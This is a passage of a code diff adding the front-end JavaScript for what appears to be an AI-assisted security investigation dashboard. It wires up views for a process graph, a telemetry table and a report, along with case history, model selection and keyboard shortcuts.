+  function switchView(view) {
+    state.activeView = view;
+    var panes = { graph: els.graphStage, telemetry: els.telemetryStage, report: els.reportStage };
+    var tabs = { graph: els.tabViewGraph, telemetry: els.tabViewTelemetry, report: els.tabViewReport };
+    Object.keys(panes).forEach(function (k) {
+      panes[k].hidden = k !== view;
+      panes[k].classList.toggle("is-active", k === view);
+      tabs[k].classList.toggle("is-active", k === view);
+      tabs[k].setAttribute("aria-selected", String(k === view));
+    });
+    if (view === "telemetry" && !state.events.length) renderTelemetryTable();
+    if (view === "report" && state.report.md) setReport(state.report.md, state.report.verdict);
+  }
+
+  function newInvestigation(opts) {
+    opts = opts || {};
+    if (state.generating && !opts.quiet) {
+      toast("Stop the current investigation first", "error");
+      return;
+    }
+    els.messagesContainer.innerHTML = "";
+    els.welcomeScreen.hidden = false;
+    setVerdictStamp("none", null);
+    clearReport();
+    state.sessionId = null;
+    state.lastSessionId = null;
+    state.selectedId = null;
+    state.scopeEventIds = null;
+    state.hiddenTypes = new Set();
+    els.graphSearchInput.value = "";
+    els.reportStageVerdictTime.textContent = "";
+    closeInspector();
+    A1Tree.reset();
+    rebuildGraph();
+    if (!opts.keepPrompt) {
+      els.promptInput.value = "";
+      autosize();
+    }
+    els.promptInput.focus();
+    scrollStream(true);
+  }
+
+  // ---------------------------------------------------------------- wiring
+
+  function autosize() {
+    var ta = els.promptInput;
+    ta.style.height = "auto";
+    ta.style.height = Math.min(170, ta.scrollHeight) + "px";
+  }
+
+  function setupEvents() {
+    els.newCaseBtn.addEventListener("click", function () {
+      newInvestigation();
+    });
+
+    els.caseBtn.addEventListener("click", function (e) {
+      e.stopPropagation();
+      setCaseMenu(!caseMenuOpen());
+    });
+    els.dbList.addEventListener("click", function (e) {
+      var b = e.target.closest("[data-db]");
+      if (b) switchDatabase(b.dataset.db);
+    });
+    els.clearHistoryBtn.addEventListener("click", function () {
+      if (!state.history.length) {
+        toast("Case log is already empty");
+        return;
+      }
+      if (!window.confirm("Delete all " + state.history.length + " saved investigations?")) return;
+      state.history = [];
+      localStorage.removeItem(HISTORY_KEY);
+      renderHistory();
+      toast("Case log cleared");
+    });
+    els.historyList.addEventListener("click", function (e) {
+      var del = e.target.closest("[data-del]");
+      if (del) {
+        state.history.splice(Number(del.dataset.del), 1);
+        localStorage.setItem(HISTORY_KEY, JSON.stringify(state.history));
+        renderHistory();
+        return;
+      }
+      var item = e.target.closest("[data-history]");
+      if (item) openHistoryItem(Number(item.dataset.history));
+    });
+
+    els.modelSelectorPill.addEventListener("click", function (e) {
+      e.stopPropagation();
+      setModelMenu(!modelMenuOpen());
+    });
+    els.providerTabs.addEventListener("click", function (e) {
+      var b = e.target.closest("[data-provider]");
+      if (b) setProviderTab(b.dataset.provider);
+    });
+    els.modelList.addEventListener("click", function (e) {
+      var b = e.target.closest("[data-model]");
+      if (b) setModel(state.modelTab, b.dataset.model);
+    });
+    els.modelSearchInput.addEventListener("input", renderModelList);
+    els.modelSearchInput.addEventListener("keydown", function (e) {
+      if (e.key === "Enter") {
+        var first = els.modelList.querySelector("[data-model]");
+        if (first) setModel(state.modelTab, first.dataset.model);
+      }
+    });
+    els.applyCustomModelBtn.addEventListener("click", function () {
+      var v = els.customModelInput.value.trim();
+      if (!v) {
+        toast("Enter a model id first", "error");
+        return;
+      }
+      setModel(state.modelTab, v);
+      els.customModelInput.value = "";
+    });
+
+    document.addEventListener("click", function (e) {
+      if (modelMenuOpen() && !els.modelDropdownContainer.contains(e.target)) setModelMenu(false);
+      if (caseMenuOpen() && !els.caseBtn.parentElement.contains(e.target)) setCaseMenu(false);
+    });
+
+    els.promptInput.addEventListener("input", autosize);
+    els.promptInput.addEventListener("keydown", function (e) {
+      if (e.key === "Enter" && !e.shiftKey) {
+        e.preventDefault();
+        if (!state.generating) submitPrompt(els.promptInput.value);
+      }
+    });
+    els.sendBtn.addEventListener("click", function () {
+      if (state.generating) stopRun();
+      else submitPrompt(els.promptInput.value);
+    });
+
+    els.suggestionsList.addEventListener("click", async function (e) {
+      var b = e.target.closest("[data-example]");
+      if (!b) return;
+      if (state.generating) {
+        toast("An investigation is running — stop it first", "error");
+        return;
+      }
+      var s = (state.exampleItems || [])[Number(b.dataset.example)];
+      if (!s) return;
+      if (dbLabel(state.dbPath) !== s.db) {
+        var db = state.databases.find(function (d) {
+          return (d.name || dbLabel(d.path || d)) === s.db;
+        });
+        if (!db) {
+          toast("Dataset " + s.db + " is not available", "error");
+          return;
+        }
+        var ok = await switchDatabase(db.path || db);
+        if (!ok) return;
+      }
+      els.promptInput.value = s.query;
+      autosize();
+      submitPrompt(s.query);
+    });
+
+    els.evidenceBtn.addEventListener("click", toggleDrawer);
+    els.mapCloseBtn.addEventListener("click", closeDrawer);
+    els.scopeClearBtn.addEventListener("click", function () {
+      state.scopeEventIds = null;
+      rebuildGraph();
+    });
+    els.treeCollapseBtn.addEventListener("click", function () {
+      A1Tree.collapseAll();
+    });
+    els.mapViewTree.addEventListener("click", function () {
+      setMapView("tree");
+    });
+    els.mapViewLinks.addEventListener("click", function () {
+      setMapView("links");
+    });
+    window.addEventListener("resize", debounce(function () {
+      if (state.drawerOpen && window.innerWidth > 900) applyDrawerWidth(els.drawer.getBoundingClientRect().width);
+    }, 100));
+
+    els.tabViewGraph.addEventListener("click", function () { switchView("graph"); });
+    els.tabViewTelemetry.addEventListener("click", function () { switchView("telemetry"); });
+    els.tabViewReport.addEventListener("click", function () { switchView("report"); });
+
+    els.graphSearchInput.addEventListener("input", debounce(renderMap, 120));
+    els.graphLegend.addEventListener("click", function (e) {
+      var b = e.target.closest("[data-type]");
+      if (b) toggleType(b.dataset.type);
+    });
+
+    els.globalDialogSearchInput.addEventListener("input", debounce(filterTelemetryTable, 120));
+    els.globalDialogCopyBtn.addEventListener("click", function () {
+      if (!state.tableRows.length) {
+        toast("No events to copy", "error");
+        return;
+      }
+      copyText(csvFromRows(state.tableRows), "Events CSV");
+    });
+
+    els.globalDialogTableWrap.addEventListener("click", function (e) {
+      var row = e.target.closest(".erow");
+      if (!row) return;
+      var raw = row.nextElementSibling;
+      if (!raw) return;
+      raw.hidden = !raw.hidden;
+      row.setAttribute("aria-expanded", String(!raw.hidden));
+    });
+    els.globalDialogTableWrap.addEventListener("keydown", function (e) {
+      if (e.key !== "Enter" && e.key !== " ") return;
+      var row = e.target.closest(".erow");
+      if (!row) return;
+      e.preventDefault();
+      row.click();
+    });
+
+    els.reportStageCopyBtn.addEventListener("click", function () {
+      if (!state.report.md) {
+        toast("No report to copy yet", "error");
+        return;
+      }
+      copyText(state.report.md, "Report markdown");
+    });
+
+    els.inspectorCloseBtn.addEventListener("click", function () {
+      closeInspector();
+      state.selectedId = null;
+      A1Tree.selectOnly(els.graphCanvasContainer, "");
+    });
+    els.inspectorBody.addEventListener("click", function (e) {
+      var action = e.target.closest("[data-inspector]");
+      if (action) {
+        if (action.dataset.inspector === "copy" && state.selectedId) {
+          copyText(state.selectedId.split(":").slice(1).join(":") || state.selectedId, "Entity");
+        }
+        return;
+      }
+      var go = e.target.closest("[data-goto]");
+      if (go) {
+        A1Tree.select(go.dataset.goto);
+        return;
+      }
+      var ev = e.target.closest("[data-event]");
+      if (ev) {
+        openDrawer("telemetry");
+        els.globalDialogSearchInput.value = ev.dataset.event;
+        filterTelemetryTable();
+      }
+    });
+
+    els.shortcutsBtn.addEventListener("click", function () {
+      els.shortcutsPop.hidden = !els.shortcutsPop.hidden;
+    });
+    els.shortcutsCloseBtn.addEventListener("click", function () {
+      els.shortcutsPop.hidden = true;
+    });
+
+    els.drawerGrip.addEventListener("pointerdown", function (e) {
+      if (window.matchMedia("(max-width: 900px)").matches) return;
+      e.preventDefault();
+      var grip = els.drawerGrip;
+      var startX = e.clientX;
+      var startW = els.drawer.getBoundingClientRect().width;
+      var width = startW;
+      var max = drawerMax();
+      document.body.classList.add("is-resizing");
+      try {
+        grip.setPointerCapture(e.pointerId);
+      } catch (err) {
+        /* pointer capture is best effort */
+      }
+      function move(ev) {
+        width = Math.max(DRAWER_MIN, Math.min(max, startW + (startX - ev.clientX)));
+        document.documentElement.style.setProperty("--drawer-w", Math.round(width) + "px");
+      }
+      function up() {
+        document.removeEventListener("pointermove", move);
+        document.removeEventListener("pointerup", up);
+        document.removeEventListener("pointercancel", up);
+        document.body.classList.remove("is-resizing");
+        try {
+          if (grip.hasPointerCapture(e.pointerId)) grip.releasePointerCapture(e.pointerId);
+        } catch (err) {
+          /* ignore */
+        }
+        try {
+          localStorage.setItem(DRAWER_KEY, String(Math.round(width)));
+        } catch (err) {
+          /* storage may be unavailable */
+        }
+        // Let the table and inspector settle against the final width.
+        requestAnimationFrame(function () {
+          void els.drawer.offsetWidth;
+        });
+      }
+      document.addEventListener("pointermove", move);
+      document.addEventListener("pointerup", up);
+      document.addEventListener("pointercancel", up);
+    });
+
+    els.drawerGrip.addEventListener("keydown", function (e) {
+      if (e.key !== "ArrowLeft" && e.key !== "ArrowRight") return;
+      e.preventDefault();
+      var width = applyDrawerWidth(els.drawer.getBoundingClientRect().width + (e.key === "ArrowLeft" ? 24 : -24));
+      try {
+        localStorage.setItem(DRAWER_KEY, String(Math.round(width)));
+      } catch (err) {
+        /* ignore */
+      }
+    });
+
+    els.drawerGrip.addEventListener("dblclick", function () {
+      var width = Math.min(620, Math.max(DRAWER_MIN, Math.round(window.innerWidth * 0.52)));
+      applyDrawerWidth(width);
+      try {
+        localStorage.setItem(DRAWER_KEY, String(Math.round(width)));
+      } catch (err) {
+        /* ignore */
+      }
+    });
+
+    document.addEventListener("keydown", function (e) {
+      var typing = /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+      if (e.key === "Escape") {
+        if (modelMenuOpen()) return setModelMenu(false);
+        if (caseMenuOpen()) return setCaseMenu(false);
+        if (!els.shortcutsPop.hidden) {
+          els.shortcutsPop.hidden = true;
+          return;
+        }
+        if (els.graphInspectorDrawer.classList.contains("is-open")) return closeInspector();
+        if (state.drawerOpen) return closeDrawer();
+        return;
+      }
+      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
+        e.preventDefault();
+        setModelMenu(!modelMenuOpen());
+        return;
+      }
+      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "e") {
+        e.preventDefault();
+        toggleDrawer();
+        return;
+      }
+      if (e.key === "?" && !typing) {
+        els.shortcutsPop.hidden = !els.shortcutsPop.hidden;
+        return;
+      }
+      if (e.key === "Enter" && !typing && !state.generating && !els.welcomeScreen.hidden) {
+        els.promptInput.focus();
+      }
+    });
+  }
+
+  // ---------------------------------------------------------------- boot
+
+  async function loadStatus() {
+    try {
+      var s = await api("/api/status");
+      state.databases = s.databases || [];
+      state.dbPath = s.current_db || (state.databases[0] ? state.databases[0].path : "");
+      var llm = s.active_llm || {};
+      state.provider = llm.provider || "";
+      state.model = llm.model || "";
+      els.railStatus.innerHTML = '<i class="dot"></i><span>' + escapeHtml((state.provider || "no provider") + " · local") + "</span>";
+    } catch (e) {
+      toast("Backend status unavailable: " + e.message, "error");
+      els.railStatus.innerHTML = '<i class="dot is-bad"></i><span>backend offline</span>';
+    }
+    renderDatabases();
+    updateModelUI();
+    setDbChrome();
+  }
+
+  async function loadModels() {
+    try {
+      var m = await api("/api/models");
+      state.models = {
+        opencode: m.opencode || [],
+        ollama: m.ollama || [],
+        openai: m.openai || [],
+      };
+      if (state.provider && state.models[state.provider]) setProviderTab(state.provider);
+      else setProviderTab("opencode");
+    } catch (e) {
+      els.modelList.innerHTML = '<p class="menu-note">Model catalog unavailable: ' + escapeHtml(e.message) + "</p>";
+    }
+  }
+
+  function init() {
+    [
+      "newCaseBtn", "caseBtn", "caseMenu", "headerDbName", "dbHint", "dbList", "clearHistoryBtn",
+      "historyList", "railStatus", "headerDbMeta", "verdictStamp", "verdictStampLabel", "verdictStampConf",
+      "evidenceBtn", "evidenceBadge", "modelDropdownContainer", "modelSelectorPill", "activeModelName",
+      "activeProviderBadge", "modelMenu", "providerTabs", "modelSearchInput", "modelList", "customModelInput",
+      "applyCustomModelBtn", "shortcutsBtn", "stream", "welcomeScreen", "emptyTitle", "emptyMeta",
+      "suggestionsList", "examplesEmpty", "messagesContainer", "promptInput", "inputCapsule", "composerModel",
+      "composerDb", "composerHint", "sendBtn", "drawer", "drawerGrip", "tabViewGraph", "graphNodeCountBadge",
+      "tabViewTelemetry", "tabViewReport", "mapCloseBtn", "graphStage", "graphSearchInput", "treeCollapseBtn",
+      "graphLegend", "graphStats", "scopeClearBtn", "graphCanvasContainer", "processLinksContainer",
+      "mapViewTree", "mapViewLinks", "graphInspectorDrawer",
+      "inspectorTypeBadge", "inspectorCloseBtn", "inspectorTitle", "inspectorSubtitle", "inspectorBody",
+      "telemetryStage", "globalDialogSearchInput", "globalDialogCopyBtn", "globalDialogMeta",
+      "globalDialogCountBadge", "globalDialogTableWrap", "reportStage", "reportStageVerdictTag",
+      "reportStageVerdictTime", "reportStageCopyBtn", "reportStageContent", "shortcutsPop",
+      "shortcutsCloseBtn", "toast",
+    ].forEach(function (id) {
+      els[id] = $(id);
+    });
+
+    setupEvents();
+    loadHistory();
+
+    try {
+      var savedW = Number(localStorage.getItem(DRAWER_KEY));
+      if (savedW >= DRAWER_MIN) applyDrawerWidth(savedW);
+    } catch (e) {
+      /* ignore */
+    }
+
+    window.A1 = { state: state, tree: window.A1Tree };
+
+    loadStatus().then(function () {
+      renderDatabases();
+      renderExamples();
+      updateEmpty();
+      if (state.dbPath) loadEvents();
+    });
+    loadModels();
+    autosize();
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
 })();
